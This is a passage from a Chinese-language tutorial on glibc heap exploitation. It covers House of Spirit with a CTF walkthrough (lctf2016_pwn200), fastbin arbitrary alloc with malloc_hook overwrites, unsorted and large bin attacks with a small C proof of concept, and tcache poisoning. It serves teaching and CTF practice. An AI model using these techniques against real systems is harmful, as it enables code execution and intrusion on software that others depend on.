。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">       of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">       after getting the lock.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">        assert(locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">    &#125;)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成
double free 的情况。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>pwndbg 的 try_free 命令可以检查是否能成功 free 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/dc5224340a5408c0a246535b4277c389.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>例题：lctf2016_pwn200</p>
<p>本上什么保护都没开，可以直接在堆栈中部署 shellcode 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2c5fc176e33bedac5f98efe6513de64d.png"
                     
alt="image-20220214184043313" 
                > - <code>main</code> 函数：</p>
<p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_40079D</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">sub_400A8E</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>主要调用 <code>sub_400A8E</code> 函数。</p>
<ul>
<li><p><code>sub_400A8E</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;who are u?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;name[i], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( name[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      name[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s, welcome to ISCC~ \n&quot;</span>, name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me your id ~~?&quot;</span>);</span><br><span class="line">  <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_400A29</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><p>name 存在 off-by-one 漏洞，通过输入 48 字节填充数据可以泄露栈地址
rbp 。</p></li>
<li><p>name 本身 48 字节大小可以恰好存下 pwntools 生成的 shellcode
。</p></li>
<li><p>获取的 id 写到了栈中，这个可以作为 fake chunk 下一个 chunk 的
size 字段。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400B1F                 call    get_num</span><br><span class="line">.text:0000000000400B24                 cdqe</span><br><span class="line">.text:0000000000400B26                 mov     [rbp+id], rax</span><br></pre></td></tr></table></figure></div></p></li>
<li><p><code>sub_400A29</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> money[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me money~&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, money, <span class="number">64uLL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, money);</span><br><span class="line">  ptr = dest;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4009C4</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>money 存在缓存区溢出漏洞，可以修改 dest 指针指向 fake chunk
的内存区域，进而将 ptr 修改为该值。</li>
<li>money 本身可以构造 fake chunk 的头部</li>
</ul></li>
<li><p><code>sub_4009C4</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4009C4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      num = <span class="built_in">get_num</span>();</span><br><span class="line">      <span class="keyword">if</span> ( num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">alloc</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;good bye~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>delete</code> 函数可以释放 fake chunk ，触发 House Of Spirit
漏洞。</li>
<li><code>alloc</code> 函数可以申请释放的 fake chunk ，从而修改
<code>sub_400A29</code> 的返回地址 为 shellcode 地址。</li>
</ul></li>
</ul>
<p>利用过程：</p>
<ol type="1">
<li>name 填入 shellcode ，利用 off-by-one 漏洞获取 rbp 。注意 shellcode
不能有 <code>\x00</code> 字节，否则会截断无法泄露 rbp 。</li>
<li>id 填入 fake chunk 下一个 chunk 的 size 值，填入 0x41 即可。</li>
<li>money 构造 fake 头部，并修改 dest 指向 fake chunk 内存区域</li>
<li>释放 ptr 指针指向的 fake chunk ，触发 House Of Spirit 漏洞。</li>
<li>申请到 fake chunk ，并将 <code>sub_400A29</code> 返回地址修改为
shellcode 地址（rbp-0x50）。 以上过程完成 fake chunk
构造和申请，此时栈结构如下图： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9fa8fdababb35c36a06e85c603520a11.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>退出执行 shellcode 获取 shell 。 ## Alloc to Stack &amp; Arbitrary
Alloc</li>
</ol>
<p>劫持 fastbin 链表中 chunk 的 fd 指针，把 fd
指针指向我们想要分配的地址处，从而实现控制一些关键数据，比如返回地址等。</p>
<p>fd 指向的内存能申请出来的前提是该内存对应 size 处的值与该 fast bin
对应 size 相同。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line">        idx = fastbin_index(nb);</span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">                errout:</span><br><span class="line">                malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div> 由于这里的 size 不考虑低 3 比特，并且
libc 或栈地址多数是 0x7f 开头，因此可以通过截取 0x7f 然后用 0x70 的
fastbin 将该内存申请出来。 例如修改 fd 指针指向
<code>__realloc_hook</code> 前合适的偏移（通常是
<code>__malloc_hook</code> 往前 0x23 的偏移），两次
<code>malloc(0x60)</code> 申请出该地址的 fake chunk 实现对
<code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的控制。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a9fa9baa971ea4a92068b2c1f1152188.png"
                     
alt="在这里插入图片描述" 
                > 由于 one_gadget
可能因栈结构不满足条件而失效，可以通过修改 <code>__malloc_hook</code> 为
<code>realloc+偏移</code> ，修改 <code>__realloc_hook</code> 为
<code>one_gadget</code> 改变栈结构来获取 <code>shell</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/98c0f43d533b1ed67fb794ab76a6c6c9.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>除了 realloc + 偏移外，还可以通过触发 malloc 报错执行 malloc
来改变栈结构。 # Unsorted Bin Attack</p>
<h2 id="unsorted-bin-leak">Unsorted Bin Leak</h2>
<p>由于 unsorted bin 是双向链表，因此在 unsorted bin
链表中必有一个节点的 <code>fd</code> 指针会指向 <code>main_arena</code>
结构体内部。如果我们可以把正确的 <code>fd</code> 指针 leak
出来，就可以获得一个与 <code>main_arena</code>
有固定偏移的地址，这个偏移可以通过调试得出。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7206f8e4b4483e5869a8033343497c8a.png"
                     
alt="image-20220216135528044" 
                >
<figcaption aria-hidden="true">image-20220216135528044</figcaption>
</figure>
<p>而<code>main_arena</code> 是一个 <code>struct malloc_state</code>
类型的全局变量，是 <code>ptmalloc</code>
管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在
<code>.data</code> 或者 <code>.bss</code>
等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code>
文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code>
基地址的偏移，从而获取 libc 的基地址。</p>
<p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是
0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code>
的地址，这样可以大幅减小工作量。以 pwntools 为例</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure></div>
<p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p>
<h2 id="unsorted-bin-attack">Unsorted Bin Attack</h2>
<p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code>
的位置写入本 Unsorted Bin 的位置。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="built_in">unsorted_chunks</span> (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span> (av);</span><br></pre></td></tr></table></figure></div>
<p>换而言之，如果我们控制了 bk 的值，我们就能将
<code>unsorted_chunks (av)</code> 写到任意地址。通常可以利用此方法向
<code>global_max_fast</code> 写入一个较大的值，从而扩大 fast bin
范围，甚至 <code>fastbinsY</code> 数组溢出 造成任意地址写。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f8bb7fdeae34ead63a5ec4ea808a7aab.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
unsorted bin attack 之后，fake chunk 被链入 unsorted bin 中，此时要想将
unsorted bin 申请出来必须通过如下检查： - 检查 size 是否合法
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">&gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br></pre></td></tr></table></figure></div> - unsorted bin chunk 的 bk 字段指向的地址必须为可写
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></div> 后续会介绍 House of Storm 利用手法，本质是在 unsorted bin
attack 的基础上利用 large bin attack 进行两处任意地址写来伪造 fake chunk
的 size 和 bk ，从而将 fake chunk 申请出来。</p>
<p>不过从 glibc-2.28 开始会有如下检查，此方法失效。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div> #
Large Bin Attack (House of Fun) Large Bin Attack 就是通过修改位于 large
bin 的 chunk 的指针，然后让其它的 chunk 进入 large bin
，借助链表操作在目标地址处写入一个堆的地址。 large bin 可以利用的指针有
bk 和 bk_nextsize 。 ## 早期的 Large Bin Attack glibc-2.30 之前，由于
chunk 链入 large bin 的过程中缺乏对 bk 和 bk_nextsize
指针的检查，因此可以 通过修改 bk 和 bk_nextsize
指针进行两处任意地址写。</p>
<p>如果新加入的 chunk <strong>不小于 large bin 中的 chunk</strong>
会进行如下操作：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">       &#123;</span><br><span class="line">         ...</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         victim_index = largebin_index (size);</span><br><span class="line">         bck = bin_at (av, victim_index);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">   &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">               &#123;</span><br><span class="line">                 ...</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>
<p>劫持一个 large bin 中一个<strong>在同等大小 chunk 中 bk 方向最靠前的
chunk</strong> 的 <strong>bk</strong> 和 <strong>bk_nextsize</strong>
然后释放一个比该 chunk <strong>稍大一些</strong>的 chunk
就可以实现下图所示效果。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8ada377542ce2b6f3de0cf31202bef1d.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>自 glibc-2.30 开始如果加入的 chunk 不是最小的则在插入链表时会对 bk
指针进行检查。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div> ## 新版本的 Large Bin Attack</p>
<p>如果新加入的 chunk <strong>小于 large bin 中的 chunk</strong>
会进行如下操作： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">  &#123;</span><br><span class="line">   ...</span><br><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">      &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">   ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div> 如果通过让新加入 large bin 小于 large
bin 最小的 chunk 来绕过检查需要伪造 bk 指向的 fake chunk 的 size
字段。并且这里的 bk 是 bins 上的 bk ，不容易劫持。所以一般不会考虑利用
bk 指针进行 large bin attack 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br></pre></td></tr></table></figure></div></p>
<p><strong>与 bk 不同的是 bk_nextsize 来自的是 fwd(unsorted bin)-&gt; fd
而不是 unsorted bin ，可以劫持。</strong> 因此如果将 large bin
中的<strong>最小</strong>的 chunk 的 <code>bk_nextsize</code> 指向
<code>&amp;target - 0x20</code>
的位置，然后加入一个<strong>更小</strong> chunk 就会将 target 写入新加入
chunk 的地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/dd2efd0fb9e0eb7cf2d69e9ea31f41ac.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/large_bin_attack" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  </span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>除了申请更大的 chunk 外，也可以通过申请较小的 chunk 来触发 large bin
attack 。因为从 unsorted bin 中直接切割 chunk 的条件中
<code>victim == av-&gt;last_remainder</code> 没有满足（因为成为
last_remainder 的条件之一是大小在 small bin 范围内），最终 unsorted bin
中的 chunk 进入 large bin 中触发 large bin attack 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>
<p>之后，程序会在 large bin 中按 size 升序寻找合适 chunk
来切割出所需的内存。由于 large bin 通过
<code>first (bin)-&gt;bk_nextsize</code> 访问最小的 chunk
，因此最先查找到的是刚刚进入 large bin 的 chunk 并且该 chunk
大小满足条件。之后该 chunk 会从 large bin
中取出然后从中切下所需的内存并将剩余部分放入 unsorted bin 。因此最终写入
target 的值是最开始修改了 bk_nextsize 的 chunk 的地址。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">     <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">  &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">    &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         victim = victim-&gt;bk_nextsize;</span><br><span class="line">         <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                 (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line">         ...</span><br><span class="line">         unlink_chunk (av, victim);</span><br><span class="line">... <span class="comment">// 切割 chunk 并将 chunk 的剩余部分放入 unsorted bin</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/55abd925f9352c4942f40cd924a61c43.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ></p>
<h1 id="tcache-attack">Tcache attack</h1>
<p>tcache 类似 fast bin ，但是 next 指针指向的是下一个 chunk
的内存区域且检查比 fast bin 少。 ## 绕过 tcache 如果想让释放的 chunk
不进入 tcache 有如下方法： - 释放不在 tcache 大小范围的 chunk。 - 释放 7
个同样大小的 tcache 填满对应位置的 bin。 - 如果题目限制了 free
次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1
来绕过 tcache 。 - 控制 tcache_perthread_struct 从而控制 counts 实现绕过
tcache 。 ## tcache poisoning</p>
<p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc
到任何地址。 ## House of Autm 这是一个关于 tcachebin 的技巧，用于修改
chunk presize/size，利用过程如下： - 申请 chunk A，大小在 fastbin
范围内。 - 释放 A，连续释放 8 次，此时，A 的 fd 被清 0，A 也被放置到了
fastbin 里面。 - 申请一个 chunk，将其 fd 修改为 A - 0x10，此时 tcache
中的 counts 为 6 。 - 再申请一个 chunk，从 fastbin 里面取，但是会把
fastbin 里面剩余的一个 chunk 链入到 tcachebin 。 -
再次分配就会分配到地址 A-0x10 处，就可以修改原来 A 的 presize/size
等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/da17c26dc9c6da24b5f8be1fe7d597e4.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
glibc-2.29 开始增加了 tcache key 来检测 double free 。</p>
<p>glibc-2.30 之后逻辑变了，原来是判断
<code>entry[idx]!=NULL</code>，glibc-2.30 之后判断
<code>count[idx] &gt; 0</code> 。</p>
